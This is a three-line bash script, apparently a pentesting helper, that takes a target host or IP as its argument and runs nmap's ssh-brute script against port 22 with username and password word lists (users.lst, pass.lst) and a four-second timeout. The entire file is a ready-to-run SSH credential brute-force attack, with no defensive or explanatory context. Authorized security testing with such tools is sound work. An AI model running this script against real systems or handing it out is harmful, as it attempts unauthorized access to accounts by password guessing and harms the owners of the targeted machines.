#!/bin/env bash
# run.sh target.com/ip
nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s $1
